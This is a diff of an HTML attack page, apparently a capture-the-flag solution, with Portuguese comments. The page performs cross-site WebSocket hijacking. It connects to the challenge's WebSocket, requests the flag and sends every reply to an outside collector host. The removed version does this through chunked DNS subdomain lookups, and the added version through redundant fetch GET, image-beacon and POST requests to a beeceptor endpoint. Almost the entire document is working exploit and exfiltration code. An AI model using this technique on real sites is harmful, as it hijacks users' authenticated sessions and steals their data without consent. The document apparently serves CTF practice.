@@ -1,87 +1,88 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>DNS Exfiltration</title>
+    <title>WebSocket Flag Exfiltration</title>
 </head>
 <body>
-    <h1>Connecting...</h1>
+    <h1>Extraindo flag...</h1>
     
     <script>
-        // Seu subdomínio de captura DNS (substitua pelo seu)
-        const dnsLogger = "8fx9jtvx.requestrepo.com";
+        // Endpoint Beeceptor para exfiltração
+        const exfilEndpoint = "https://testctf.free.beeceptor.com";
         
-        // Enviar ping inicial para confirmar que o script está rodando
-        new Image().src = `http://init.${dnsLogger}`;
-        
-        // Função para exfiltrar dados via consulta DNS
-        function exfiltrateViaDNS(data) {
-            // Codificar dados para URL segura
-            const encoded = encodeURIComponent(data)
-                .replace(/\./g, '-dot-')
-                .replace(/\//g, '-slash-')
-                .replace(/:/g, '-colon-');
+        // Função para enviar dados para o Beeceptor
+        function sendToBeeceptor(data) {
+            // Método 1: Usar fetch (mais confiável)
+            fetch(exfilEndpoint + "/flag?data=" + encodeURIComponent(data), {
+                method: 'GET',
+                mode: 'no-cors' // Importante para evitar erros CORS
+            }).catch(e => console.error("Erro no fetch:", e));
             
-            // Dividir em chunks para evitar problemas com nomes de domínio longos
-            const chunks = [];
-            let temp = '';
-            for (let i = 0; i < encoded.length; i++) {
-                temp += encoded[i];
-                if (temp.length >= 30 || i === encoded.length - 1) {
-                    chunks.push(temp);
-                    temp = '';
-                }
-            }
+            // Método 2: Backup usando Image (para contornar possíveis bloqueios)
+            new Image().src = exfilEndpoint + "/img?data=" + encodeURIComponent(data);
             
-            // Enviar cada chunk como uma consulta DNS separada
-            chunks.forEach((chunk, index) => {
-                new Image().src = `http://data-${index}-${chunk}.${dnsLogger}`;
-            });
+            // Método 3: Enviar via POST (outro backup)
+            fetch(exfilEndpoint + "/post", {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ flag: data })
+            }).catch(e => console.error("Erro no POST:", e));
         }
         
-        // Conectar ao WebSocket alvo
-        const socket = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
+        // Iniciar captura
+        sendToBeeceptor("init_" + new Date().toISOString());
         
-        socket.onopen = function() {
-            // Enviar ping quando a conexão for estabelecida
-            new Image().src = `http://connected.${dnsLogger}`;
+        // Estabelecer conexão WebSocket
+        try {
+            const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
             
-            // Enviar comando para obter a flag
-            socket.send(JSON.stringify({
-                sender: 'user',
-                message: '/getFlag'
-            }));
+            ws.onopen = function() {
+                sendToBeeceptor("ws_connected");
+                
+                // Enviar comando para obter a flag
+                ws.send(JSON.stringify({
+                    sender: 'user',
+                    message: '/getFlag'
+                }));
+                
+                sendToBeeceptor("flag_requested");
+            };
             
-            // Enviar ping para confirmar que o comando foi enviado
-            new Image().src = `http://command-sent.${dnsLogger}`;
-        };
-        
-        socket.onmessage = function(event) {
-            try {
-                const data = JSON.parse(event.data);
-                
-                // Enviar todas as mensagens via DNS
-                exfiltrateViaDNS(data.message);
-                
-                // Se contiver a flag, enviar um identificador especial
-                if (data.message && data.message.includes('Flag:')) {
-                    new Image().src = `http://flag-found.${dnsLogger}`;
-                    exfiltrateViaDNS("FLAG:" + data.message);
+            ws.onmessage = function(event) {
+                try {
+                    const data = JSON.parse(event.data);
+                    sendToBeeceptor("received_" + data.message);
+                    
+                    // Quando receber a flag, enviá-la de várias maneiras
+                    if (data.message && data.message.includes('Flag:')) {
+                        // Enviar a flag várias vezes com diferentes métodos para garantir
+                        sendToBeeceptor("FLAG_FOUND_" + data.message);
+                        
+                        // Enviar a flag de forma redundante para garantir que chegue
+                        for (let i = 0; i < 3; i++) {
+                            setTimeout(() => {
+                                sendToBeeceptor("FLAG_ATTEMPT_" + i + "_" + data.message);
+                            }, i * 500); // Tentar várias vezes com intervalos
+                        }
+                    }
+                } catch (e) {
+                    sendToBeeceptor("parse_error_" + e.message);
                 }
-            } catch (e) {
-                // Enviar erro via DNS
-                exfiltrateViaDNS("ERROR:" + e.message);
-            }
-        };
-        
-        socket.onerror = function(error) {
-            // Enviar erro via DNS
-            exfiltrateViaDNS("WS_ERROR");
-        };
-        
-        socket.onclose = function() {
-            // Enviar aviso de fechamento via DNS
-            exfiltrateViaDNS("WS_CLOSED");
-        };
+            };
+            
+            ws.onerror = function(error) {
+                sendToBeeceptor("ws_error");
+            };
+            
+            ws.onclose = function() {
+                sendToBeeceptor("ws_closed");
+            };
+        } catch (e) {
+            sendToBeeceptor("init_error_" + e.message);
+        }
     </script>
 </body>
 </html>
